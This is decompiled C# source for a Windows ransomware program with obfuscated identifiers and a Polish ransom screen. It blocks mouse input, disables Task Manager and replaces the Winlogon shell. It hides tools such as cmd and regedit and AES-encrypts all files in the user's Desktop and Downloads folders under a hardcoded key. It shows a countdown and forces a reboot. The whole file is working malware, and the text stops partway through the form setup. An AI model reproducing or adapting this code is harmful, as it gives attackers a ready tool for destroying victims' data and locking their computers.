using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int PYU4wjer3jiSsirPjUpi56Sr7uydjSgM5N0ceeGH5xl5q5xXcrdYI = 0;

	private const int int_0 = 5;

	private IContainer gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj = null;

	private PictureBox EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy;

	private PictureBox jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb;

	private Label lbl1;

	private Label cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb;

	private TextBox ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV;

	private Button H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR;

	private Label VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb;

	private Label Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe;

	private Timer XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN;

	private Timer zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc;

	private Timer AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC;

	private Timer xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx;

	private Timer eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq;

	[DllImport("User32")]
	private static extern int ShowWindow(int int_1, int vQjARXT3zFAgz2B97OrQUA0tLEoDdZNNOV0HQX1MHAKfkmROD2hDjIOTyl12reOUS);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool nueJSood59np5KpB2mKbclMEgvKW0aga9r8ry8VjQCc8u3UAl3LygLhHiZ3UoZlCt);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(1080, 720));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN.Start();
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc.Start();
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.Start();
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx.Start();
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
		}
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Ransomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).get_Text() == "")
		{
			MessageBox.Show("Niepoprawny Klucz", "ZŁY KLUCZ", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).get_Text() == "mateo")
		{
			MessageBox.Show("Klucz poprawny", "ODBLOKOWYWANIE", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			OFF_Encrypt();
			Process[] array = null;
			array = Process.GetProcessesByName("Rasomware2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Niepoprawny Klucz", "ZŁY KLUCZ", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void FreezeMouse()
	{
		BlockInput(nueJSood59np5KpB2mKbclMEgvKW0aga9r8ry8VjQCc8u3UAl3LygLhHiZ3UoZlCt: true);
	}

	public static void Thawouse()
	{
		BlockInput(nueJSood59np5KpB2mKbclMEgvKW0aga9r8ry8VjQCc8u3UAl3LygLhHiZ3UoZlCt: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "mateo";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "mateo";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	protected override void Dispose(bool iSiPQIkkP94Ta9v8E1PJMPmsD6Vivzs4V5kRmC3yeacDl6uL2LP8lH)
	{
		if (iSiPQIkkP94Ta9v8E1PJMPmsD6Vivzs4V5kRmC3yeacDl6uL2LP8lH && gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj != null)
		{
			gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj.Dispose();
		}
		((Form)this).Dispose(iSiPQIkkP94Ta9v8E1PJMPmsD6Vivzs4V5kRmC3yeacDl6uL2LP8lH);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b8: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_0412: Expected O, but got Unknown
		//IL_04d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04df: Expected O, but got Unknown
		//IL_057c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0586: Expected O, but got Unknown
		//IL_07d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e2: Expected O, but got Unknown
		//IL_0823: Unknown result type (might be due to invalid IL or missing references)
		//IL_082d: Expected O, but got Unknown
		gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy = new PictureBox();
		jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb = new PictureBox();
		lbl1 = new Label();
		cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb = new Label();
		ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV = new TextBox();
		H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR = new Button();
		VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb = new Label();
		Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe = new Label();
		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN = new Timer(gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj);
		zrcObvlaUKs7xFGUjAQAiFOt5E2DHaRDFAIIMkxqn2TPW9nEAmpgxVJYkfIYWc = new Timer(gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj);
		AVfyXf2KMi8Iz0dvlYRLV16PtHZqZhcvLrx2O7Luv9JZpsFpDKHC = new Timer(gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj);
		xPfCrfAwbZvdta5tDz4Z2Mm7UK9oxBlV5VYWsBhERg8Rm1WqjTbgC9MALGf8WbGwdx = new Timer(gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj);
		eJENBUxXbyuZG7A8lPfwKLwWUmgxzKh9v7LxW3caQ55MlBSMFoq = new Timer(gGesgvinKsCuDdeSxCVEl31p11cERc8SgFizlxMBJIu7cx4nsaj);
		((ISupportInitialize)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).BeginInit();
		((ISupportInitialize)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).BeginInit();
		((Control)this).SuspendLayout();
		((Control)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).set_Cursor(Cursors.get_No());
		EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).set_Location(new Point(18, 578));
		((Control)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).set_Name("pictureBox1");
		((Control)EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy).set_Size(new Size(125, 105));
		EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy.set_SizeMode((PictureBoxSizeMode)1);
		EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy.set_TabIndex(0);
		EFuhb4uhY40PG1bL0Cdj6bI8sotrGHSeQ945C1EhM0odhtonD7ZOT3Llqu04O4gPy.set_TabStop(false);
		((Control)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).set_Cursor(Cursors.get_No());
		jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).set_Location(new Point(677, 578));
		((Control)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).set_Name("pictureBox2");
		((Control)jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb).set_Size(new Size(125, 105));
		jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb.set_SizeMode((PictureBoxSizeMode)1);
		jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb.set_TabIndex(1);
		jPmOAPWtJS1z78z7tayIbawaW6fsNWjeCKXAIRzH7WO0bm1iogb.set_TabStop(false);
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_AutoSize(true);
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Cursor(Cursors.get_Help());
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_ForeColor(Color.White);
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Location(new Point(19, 0));
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Name("label1");
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Size(new Size(783, 550));
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_TabIndex(3);
		((Control)cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb).set_Text(componentResourceManager.GetString("label1.Text"));
		cxw7Wsd3XTKAAlOux8FVm7yf8BZNkhlgdqDvDOMzBhbICPdcUXXJb.set_TextAlign((ContentAlignment)32);
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_BackColor(Color.Red);
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_Location(new Point(211, 553));
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_Name("codebox");
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_Size(new Size(398, 31));
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).set_TabIndex(5);
		ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV.set_TextAlign((HorizontalAlignment)2);
		((Control)ngNe4hXX0UGwj9DjKbJsLL6Af4DtTopXc1ZVZeNVCmDsv9YTUV).add_TextChanged((EventHandler)codebox_TextChanged);
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Cursor(Cursors.get_Hand());
		((ButtonBase)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_FlatStyle((FlatStyle)1);
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_ForeColor(Color.White);
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Location(new Point(211, 590));
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Name("button1");
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Size(new Size(398, 53));
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_TabIndex(6);
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_Text("ODBLOKUJ KOMPUTER");
		((ButtonBase)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).set_UseVisualStyleBackColor(true);
		((Control)H1gFILJmGL0ukjRbzdjiCZ00qjU3WedeN5uzcN4pu7bsBR440XZmbP3G19CjBdSFnpR).add_Click((EventHandler)button1_Click);
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_AutoSize(true);
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Cursor(Cursors.get_No());
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Font(new Font("Arial Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_ForeColor(Color.White);
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Location(new Point(498, 653));
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Name("label2");
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Size(new Size(111, 30));
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_TabIndex(7);
		((Control)VzFqi3YjPm0WJMjBVzfw75iuBjE5hwHT0c3SsWkx57ILnx1ANrxGjCemT4KD59QmJb).set_Text("00:00:00");
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_AutoSize(true);
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Cursor(Cursors.get_No());
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_ForeColor(Color.White);
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Location(new Point(204, 646));
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Name("label3");
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Size(new Size(114, 37));
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_TabIndex(8);
		((Control)Zz0wIgI89GBz69rIjXF4DyWfwEJCMJvEj2nZDHGNIrZj7ixUxtkFKfh5458bkqGe).set_Text("CZAS:");
		XDi7CJBxJyfSCYyD969VTOIVHeXFcyZZiEySxZj6QD1jnklm9sCRDI2JeKCr8CfALbxN.set_Enabled(true);
